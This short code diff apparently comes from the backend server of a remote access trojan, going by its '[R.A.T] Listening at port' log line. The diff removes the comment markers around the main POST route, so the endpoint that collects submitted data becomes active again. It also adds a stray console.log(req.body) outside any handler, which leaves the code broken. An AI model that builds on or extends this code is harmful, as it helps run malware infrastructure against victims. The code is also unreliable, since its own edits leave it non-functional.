@@ -38,7 +38,7 @@ setInterval(() => {
         ipMap.length = 0
     }
 }, 1000 * 60 * 15)
-/*
+
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
@@ -171,7 +171,7 @@ app.post("/", (req, res) => {
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
-*/
+
 console.log(req.body)
 //create server
 app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))
